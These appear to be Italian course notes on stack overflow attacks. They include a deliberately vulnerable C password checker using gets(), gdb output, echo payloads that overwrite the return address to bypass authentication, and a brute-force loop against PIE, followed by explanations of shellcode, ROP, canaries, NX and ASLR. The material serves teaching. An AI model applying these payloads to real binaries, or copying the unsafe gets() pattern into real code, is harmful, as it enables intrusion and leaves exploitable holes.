Lo **stack overflow** (o stack smashing) è definito come un [[Buffer overflow|buffer overflow]] che occorre nello stack.

| **Stack**          | **Delimitatori** |
| ------------------ | ---------------- |
| `var`              | `rsp`            |
| `var`              |                  |
| `var`              | `rbp`            |
| `<old rbp>`        |                  |
| `return <address>` |                  |
| `...`              |                  |
Dopo le variabili locali troviamo: il vecchio **frame pointer**, l'**indirizzo di ritorno**.
Uno stack overflow può sovrascrivere quest'ultimi per eseguire codice arbitrario.
>Vedi [[Assembly x86-64#Esecuzione di una funzione|esecuzione di una funzione]].


L'idea è quella di sovrascrivere l'indirizzo di ritorno così quando la funzione finisce eseguirà del codice arbitrario che può essere:
- **Saltare** ad un'altra locazione
- **Invocare** una funzione di una libreria
- **Inserire** codice nello stack ed invocarlo
- **Gadget**, ovvero frammenti di codice che vengono combinati assieme

Immaginando di avere il seguente codice:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int checkpassword() {
	char s[16];
	
	printf("Insert password: ");
	fflush(stdout);
	gets(s); // reads the user password, no check on length!
	if (strcmp(s, "sEgr3t0") == 0) {
		return 1;
	} else {
		return 0;
	}
}

int main(int argc, char *argv[]) {
	if (checkpassword()) {
		printf("Authenticated!\n"); // return here
		exit(EXIT_SUCCESS);
	} else {
		printf("Wrong password!\n");
		exit(EXIT_FAILURE);
	}
}
```

**Caso 1**: disabilitiamo PIE, e questa volta anche lo _stack protector_:
```bash
gcc stack-pwd.c -o stack-pwd -fno-stack-protector --no-pie --static
```

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400bc7 <+0>:     push   rbp
   0x0000000000400bc8 <+1>:     mov    rbp,rsp
   0x0000000000400bcb <+4>:     sub    rsp,0x10
   0x0000000000400bcf <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400bd2 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400bd6 <+15>:    mov    eax,0x0
   0x0000000000400bdb <+20>:    call   0x400b6d <checkpassword>
   0x0000000000400be0 <+25>:    test   eax,eax
   0x0000000000400be2 <+27>:    je     0x400bf8 <main+49> # salto
   0x0000000000400be4 <+29>:    mov    edi,0x49245e # Authenticated
   0x0000000000400be9 <+34>:    call   0x410410 <puts>
   0x0000000000400bee <+39>:    mov    edi,0x0
   0x0000000000400bf3 <+44>:    call   0x40e9c0 <exit>
   0x0000000000400bf8 <+49>:    mov    edi,0x49246d # Wrong
   0x0000000000400bfd <+54>:    call   0x410410 <puts>
   0x0000000000400c02 <+59>:    mov    edi,0x1
   0x0000000000400c07 <+64>:    call   0x40e9c0 <exit>
```

Vogliamo saltare all'indirizzo `0x0000000000400be4` per capire quanti byte bisogna inserire per eseguire un overflow controlliamo lo stack con gdb:
```bash
# spazio per le variabili usate
0000| 0x7fffffffe590 --> 0x7ffff7de3b40 (<_dl_fini>:    push   rbp)
0008| 0x7fffffffe598 --> 0x0

0016| 0x7fffffffe5a0 --> 0x7fffffffe5c0 --> 0x5555554008a0 (<__libc_csu_init>:  push   r15) # old rbp
0024| 0x7fffffffe5a8 --> 0x555555400861 (<main+25>:     test   eax,eax) # indirizzo di ritorno
```

Dobbiamo quindi inserire 
```bash
# 16 A, sovrascrivo l'ultimo byte del vecchio rbp con 0x00
# in questo caso il programma non crasha perchè il main è semplice
# e non usa lo stack in quanto non usa variabili locali
echo -e "AAAAAAAAAAAAAAAA" | ./stack-pwd
Insert password: Wrong password!

# con 23 A sovrascrivo completamente il vecchio rbp, e notiamo che
# il programma ancora non crasha, questo perchè il main non ci fa
# più nulla con quel indirizzo, infatti esegue una print e poi esce
echo -e "AAAAAAAAAAAAAAAAAAAAAAA" | ./stack-pwd
Insert password: Wrong password!

# 24 A
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA" | ./stack-pwd
Insert password: Segmentation fault
```
ora siamo allineati sull'indirizzo di ritorno, per cui possiamo aggiungere l'indirizzo a cui vogliamo andare, ricordando che dobbiamo inserire l'indirizzo in **little-endian**, per cui:
```bash
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xe4\x0b\x40\x00\x00\x00\x00\x00"
| ./stack-pwd
Insert password: Authenticated!
```

**Caso 2**: disabilitiamo lo stack protector, ma lasciamo PIE attivo:
```bash
gcc stack-pwd.c -o stack-pwd-pie -fno-stack-protector
```
questo vuol dire che indirizzi effettivi vengono assegnati all'esecuzione del programma, per cui possiamo vederli dopo avere eseguito run all'interno di gdb, tuttavia il primo byte rimane uguale (offset), per cui possiamo tentare un attacco [[Buffer overflow#Off-by-one|off-by-one]].

```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000000848 <+0>:     push   rbp
   0x0000000000000849 <+1>:     mov    rbp,rsp
   0x000000000000084c <+4>:     sub    rsp,0x10
   0x0000000000000850 <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x0000000000000853 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000000857 <+15>:    mov    eax,0x0
   0x000000000000085c <+20>:    call   0x7ea <checkpassword>
   0x0000000000000861 <+25>:    test   eax,eax
   0x0000000000000863 <+27>:    je     0x87b <main+51>
   0x0000000000000865 <+29>:    lea    rdi,[rip+0xd2]        # 0x93e
   0x000000000000086c <+36>:    call   0x670 <puts@plt>
   0x0000000000000871 <+41>:    mov    edi,0x0
   0x0000000000000876 <+46>:    call   0x6c0 <exit@plt>
   0x000000000000087b <+51>:    lea    rdi,[rip+0xcb]        # 0x94d
   0x0000000000000882 <+58>:    call   0x670 <puts@plt>
   0x0000000000000887 <+63>:    mov    edi,0x1
   0x000000000000088c <+68>:    call   0x6c0 <exit@plt>
```

L'offset dell'indirizzo a cui vogliamo saltare è `0x865`, mentre l'indirizzo di ritorno di `<checkpassword>` è `0x861`, ipoteticamente sarebbe necessario cambiare il primo bye, quindi:
```bash
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x65" | ./stack-pwd-pie
Segmentation fault
```

Questo accade perchè `gets()` termina le stringhe con `0x00`, quindi dobbiamo sovrascrivere anche il secondo byte, ci interessa che ci sia un `0x<>8`, ma non possiamo sapere quale è la digit prima dell'$8$, in quanto viene randomizzata, modifichiamo quindi anche il secondo byte, e usiamo un approccio brute force, prima o poi anche la digit prima dell'$8$ sarà $0$:
```bash
while true;
do echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x65\x08" | ./stack-pwd-pie;
done
```

---
### Shellcodes
Uno **shellcode** è un piccolo programma che esegue una shell (o codice arbitrario), esso deve essere:
- Piccolo in modo da stare nel buffer
- Indipendente dalla posizione in memoria
- Non deve avere un null byte `0x00` ciò è dovuto al fatto che molto spesso gli overflow sono causati da operazioni su stringhe, mettendo un byte `0x00` si bloccherebbe lo shell code, in quanto verrebbe interpretato come la fine della stringa
- Indipendente da librerie
![[Shellcode.png]]Nelle architetture a 32-bit questo attacco è più pericoloso in quanto i parametri di una funzione li cerca nello stack (sotto il suo return address), non nei registri, è possibile quindi chiamare una funzione ed è pure possibile passargli i parametri:
![[Shellcode 32-bit.png]]

### Return Oriented Programming (ROP)
Questo tipo di attacco consiste nella creazione di piccoli frammenti di codice (gadget) seguiti da un return, dove il return punta ad un altro gadget, concatenandoli è possibile eseguire codice arbitrario.

Questa vulnerabilità è diffusa nella fase di de-serializzazione dei byte salvati in oggetti di qualche linguaggi di programmazione.
![[ROP.png]]
Un modo per azzerare un registro è facendo lo `xor` di se stesso, questo è preferibile rispetto alla move perchè ha un opcode più piccolo.

---
## Difese
Esistono protezioni a:
- **Compile-time**: che rendono più robusti i programmi contro certi tipi di attacchi (e.g. stack-protector)
- **Runt-time**: rivela e blocca attacchi in programmi già esistenti

### Difese compile-time
Utilizzare **linguaggi di programmazione definiti "safe"**, anche se magari le librerie a basso livello potrebbero comunque essere vulnerabili.

Scrivere del **codice sicuro**, quindi controllando sempre i limiti dei buffer, utilizzare funzioni sicure e terminare il programma in modo controllato in caso di errori.

**Stack protector**: esso aggiunge codice extra il quale controlla se lo stack viene corrotto usando un **random canary**, il quale è un valore inserito dopo l'old frame pointer e controllato prima del return, inoltre lo stack protector modifica la posizione delle variabili in modo tale che i buffer sono gli ultimi nello stack (mitiga gli overflow)

#### Canary
I canary devono essere supportati dal sistema operativo, in [[Linux]] vengono messi dentro alla [[Processi#Process Control Block|tabella dei processi]], ne viene generato uno casuale ad ogni esecuzione di programma, esso protegge solo lo stack, non l'overflow tra due buffer consecutivi.
>Il nome canary deriva dal fatto che i canarini venivano usati nelle miniere per vedere se era presente ossido di carbonio e quindi andare via.

Se il canary viene scoperto durante l'esecuzione del processo esso non serve più a nulla perchè si potrebbe procedere come segue:
1. Overflow
2. Copio il canary
3. Sovrascrivo il return address

### Difese run-time
È possibile implementare il **Non-eXecutable address space (NX)**, il quale previene l'esecuzione di codice in particolari segmenti (e.g. stack, heap) esso richiede supporto hardware.
>Previene gli shellcode, ma è inutile control le syscall e ROP, inoltre certi programmi hanno bisogno di eseguire codice nello stack.

L'**address space layout randomization (ASLR)** randomizza gli indirizzi rendendo i buffer overflow più difficili, gli offset comunque sono sempre uguali, quindi è ancora possibile sfruttare gli attacchi **off-by-one**.
>Tuttavia è inutile se gli indirizzi vengono scoperti, negli ultimi anni sono state scoperte vulnerabilità hardware per cui un programma può scoprire qualcosa di qualche altro programma affinchè vengano eseguiti nella stessa architettura (anche se su vm diverse) a causa dei **side channel**.

>[!Tip] Spectre e side channels
>[Spectre](https://spectreattack.com/spectre.pdf)  sfrutta il fatto che i processori moderni fanno [[Previsione del branch, interruzioni e ottimizzazione|speculazioni sui branch]], se sbagliano però devono scartare i calcoli fatti e ricalcolare il branch corretto, ciò è visibile in termine di prestazioni, è quindi possibile capire se un programma effettua un branch o meno osservandone il suo tempo di esecuzione.
>
>I **side channel** sono aspetti collaterali dell'esecuzione di un programma (e.g. tempo, consumo di corrente).
